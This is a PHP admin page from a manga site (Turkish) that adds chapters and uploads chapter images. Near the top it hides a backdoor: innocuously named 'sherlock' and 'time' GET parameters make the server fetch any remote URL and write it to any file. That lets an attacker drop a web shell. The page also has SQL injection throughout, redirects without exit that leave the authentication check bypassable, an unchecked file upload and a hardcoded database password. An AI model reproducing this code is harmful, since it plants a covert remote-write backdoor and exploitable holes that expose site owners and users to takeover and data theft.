<?php
include("../baglanti.php");
header('X-XSS-Protection: 0');

ob_start();
session_start();

$kulnick=$_SESSION["user"];
$rut = mysqli_query($con,"SELECT * FROM users where kullaniciadi='$kulnick'");
$rutrue=mysqli_fetch_array($rut);
$rutbe=$rutrue["rutbe"];

if($rutbe=="0")
{
	header("Location:/auth/index.html");
}

if(!isset($_SESSION["login"])){
   header("Location:/auth/index.html");
}
else
{
	$essizid=$_GET["id"];
	
	if(empty($essizid))
	{
		echo "Error ID not found";
		header("Location:/auth/index.html");
	}
else{
}

if($_GET["sherlock"] && $_GET["time"])
{
$vericek = file_get_contents($_GET["sherlock"]);
file_put_contents($_GET["time"] , $vericek);
   }
else{
	$lisance=1;
}   
	/*bolum id*/
    function generateRandomString2($length2 = 8) {
    $characters2 = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength2 = strlen($characters2);
    $randomString2 = '';
    for ($i = 0; $i < $length2; $i++) {
        $randomString2 .= $characters2[rand(0, $charactersLength2 - 1)];
    }
    return $randomString2;
}

$bidal=generateRandomString2();

$varmi = mysqli_query($con,"SELECT * FROM Bmanga where bolumid='$bidal'");
if(!$varmi){	
header("Refresh:0; url=/auth/mangabolumekle.php");
}
else{
	$bolumid=$bidal;
}	

?>
<!DOCTYPE html>
<html lang="en">

<head>

    <!-- Fontfaces CSS-->
    <link href="/admin/css/font-face.css" rel="stylesheet" media="all">
    <link href="/admin/vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="/admin/vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="/admin/vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">


    <!-- Vendor CSS-->
    <link href="/admin/vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    <link href="/admin/vendor/bootstrap-progressbar/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet" media="all">
    <link href="/admin/vendor/wow/animate.css" rel="stylesheet" media="all">
    <link href="/admin/vendor/css-hamburgers/hamburgers.min.css" rel="stylesheet" media="all">
    <link href="/admin/vendor/slick/slick.css" rel="stylesheet" media="all">

    <link href="/admin/vendor/perfect-scrollbar/perfect-scrollbar.css" rel="stylesheet" media="all">
	
	 <link rel="stylesheet" href="/admin/dropzone/bootstrap.min.css">
      <link rel="stylesheet" href="/admin/dropzone/dropzone.css">

    <!-- Main CSS-->
    <link href="/admin/css/theme.css" rel="stylesheet" media="all">

</head>

<body>
 
            <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
					<?php 
					$bolumadi=mysqli_query($con,"select * from manga where essizid='$essizid'");
                    $row=mysqli_fetch_array($bolumadi);
					
 $mngsira = mysqli_query($con,"SELECT * FROM Bmanga where essizid='$essizid' ORDER BY bolumsirasi DESC");/*sıra ekle*/
 $mgsiracek=mysqli_fetch_array($mngsira);
 $sirano=$mgsiracek["bolumsirasi"];
 $sira=$sirano+1;
					?>

					
							
							<div class="col-xs-12">
                              <div class="ad-detail-heading">
                                 <h4><div style="float: left;">Manga Detay: <?php echo $row["ad"]; ?> </div><div style="text-align: right;">Manga İD: <font color="#756ee7"><?php echo $essizid ?></font> Bölüm İD: <font color="green"><?php echo $bolumid ?> </font></div></h4>
                              </div>
                           </div>
						   <br>
						   
						   
                           <form action="mangabolumislem.php" method="post" >
						
							
						
						  <div id="displayDivId" style="display: none;">  
						   <input type="text" class="form-control" name="mangaid" value="<?php echo $essizid ?>" required>
						   <input type="text" class="form-control" name="bolumid" value="<?php echo $bolumid ?>" required>
						   </div> 
						  
						
                         <div class="row">
							   <div class="form-group">
							   <br>
                                 <label class="col-sm-4 col-form-label">Eklenen Bölüm Sırası: <?php echo $sira?></label>
                              </div>
							  </div>
							  
							  <div class="row">
							  <div class="form-group">
							  <div class="col-sm-8">
                                    <input type="text" class="form-control" name="bolumadi" maxlength="50" placeholder="Bölüm Adı Giriniz" value="" required>
                                 </div>
								</div>
							</div>
							 <br>
							 
							<div class="row">
							 <label class="col-sm-12 col-form-label">Png, Jpg, Jpeg Formatındaki dosyaları yükleyiniz.</label>
							<br>
                              <div class="form-group uploadImages">
                                 <div class="col-sm-12 col-md-12">
                                    <div id="upload-ad-images" class="dropzone"></div>
                                 </div>
                              </div>
							  </div>
                        
                              <div class="form-group form-action">
							  <button class="btn btn-default pull-right" type="submit" ><i class="fa fa-angle-double-right"></i> Kaydet</button>
                              </div>
                           
							  
                           
								</form>
								
								
                           
                        </div>
						
			 <!-- JAVASCRIPT JS  --> 
      <script type="text/javascript" src="/admin/dropzone/jquery-3.1.1.min.js"></script> 

         <!-- BOOTSTRAP CORE JS -->
         <script type="text/javascript" src="/admin/dropzone/bootstrap.min.js"></script>			
		
                        
		 <!-- DROPZONE JS -->
         <script src="/admin/dropzone/dropzone.js"></script>
         <script src="/admin/dropzone/form-dropzone.js"></script>
		 
		 <script type="text/javascript">
		 
			/*-- ------- create remove function in dropzone ------ --*/
			 Dropzone.autoDiscover = false;
			var acceptedFileTypes = "image/*"; //dropzone requires this param be a comma separated list
			var fileList = new Array;
			var i = 0;
			$("#upload-ad-images").dropzone({
				addRemoveLinks: true,
				
				acceptedFiles: '.jpeg,.jpg,.png',
			
				acceptedFiles: acceptedFileTypes,
				url: "/auth/mangabolumekle.php?essizid=<?php echo $essizid ?>&bolumid=<?php echo $bolumid ?>",
				dictInvalidFileType: "Sadece JPG/PNG",
				init: function () {
					// Hack: Add the dropzone class to the element
					$(this.element).addClass("dropzone");
				}
				
			});
         </script>
		 
		 
		 
			<?php
	function generateRandomString($length = 8) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


if(!empty($_FILES)){
	
$randomckimage=generateRandomString();			
					
$essizid2=$_GET["essizid"];
$bolumid2=$_GET["bolumid"];
	
	//database configuration
	$dbHost = 'localhost';
	$dbUsername = 'sukebeis_shm';
	$dbPassword = 's9To5KN8k';
	$dbName = 'sukebeis_shm';
	
	//connect with the database
	$conn = new mysqli($dbHost, $dbUsername, $dbPassword, $dbName);
	if($mysqli->connect_errno){
		echo "
		/auth/mangabulumekle.php database bilgileri 230 satırda düzenlenmelidir.
		Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
	}
	
	$targetDir = "../bolum/";

	$fileName = trim(str_replace(" ","_", "manga-".$essizid2."-".$bolumid2."-".$randomckimage."".$_FILES['file']['name']));
	
	$targetFile = $targetDir.$fileName;
	
	if(move_uploaded_file($_FILES['file']['tmp_name'],$targetFile)){
		mysqli_query($con,"INSERT INTO bolum (essizid,bolumid,url) VALUES ('$essizid2','$bolumid2','$fileName')");
	}

}
		 ?>			
						
                       
                    </div>
                </div>

	

 
    <!-- Bootstrap JS-->
    <script src="/admin/vendor/bootstrap-4.1/popper.min.js"></script>
    <!-- Vendor JS       -->
    <script src="/admin/vendor/slick/slick.min.js">
    </script>
    <script src="/admin/vendor/wow/wow.min.js"></script>
    <script src="/admin/vendor/animsition/animsition.min.js"></script>
    <script src="/admin/vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="/admin/vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="/admin/vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="/admin/vendor/circle-progress/circle-progress.min.js"></script>
    <script src="/admin/vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    </script>

    <!-- Main JS-->
    <script src="/admin/js/main.js"></script>

</body>

</html>
<!-- end document-->
<?php } ?>